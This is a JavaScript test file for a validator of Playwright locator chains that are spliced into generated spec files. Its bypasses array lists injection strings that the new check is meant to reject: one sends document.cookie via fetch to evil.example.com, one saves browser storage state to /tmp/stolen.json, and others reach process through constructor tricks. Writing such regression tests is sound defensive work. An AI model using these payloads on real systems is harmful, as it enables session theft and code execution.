// Prove-It: A0.5.1 — the old isSafeChain was a keyword blocklist (require/eval/process/...),
// not a structural check. Both payloads below contain none of those keywords, pass the old
// check, and splice a semicolon-terminated statement into the generated spec file — confirmed
// by running them through the old isSafeChain() then feeding `page.<result>` through new Function().
const assert = require('assert');
const { isSafeChain } = require('../core/helpers');

const bypasses = [
  "getByRole('b').click(); await page.goto('http://evil.example.com').click()",
  "locator('x').click(); await page.context().storageState({path:'/tmp/stolen.json'}).click()",
  "evaluate(() => fetch('http://evil.example.com', { method: 'POST', body: document.cookie }))",
  "locator('x'); process.exit(1)",
  "constructor.constructor('return process')().exit()",
];
for (const p of bypasses) {
  assert.strictEqual(isSafeChain(p), null, `FAIL: bypass accepted: ${p}`);
}

// Legitimate chains actually seen in this codebase's own fixtures/action DB (must keep working).
const legit = [
  "getByPlaceholder('Username')",
  "getByRole('button', { name: 'Login' })",
  "locator('form').filter({ hasText: 'Required' })",
  "frameLocator('#frame').getByRole('button', { name: 'Submit' })",
  "getByRole('row', { name: 'L-1042' }).getByRole('button', { name: 'Approve' })",
  "locator('.item').first()",
  "locator('.item').nth(2)",
];
for (const l of legit) {
  assert.strictEqual(isSafeChain(l), l, `FAIL: legitimate chain rejected: ${l}`);
}

// Not a string / empty / garbage -> null, no throw
for (const bad of [null, undefined, 42, '', 'getByRole(']) {
  assert.strictEqual(isSafeChain(bad), null, `FAIL: malformed input should reject cleanly: ${bad}`);
}

console.log('PASS: isSafeChain is a structural AST check, not a keyword blocklist');
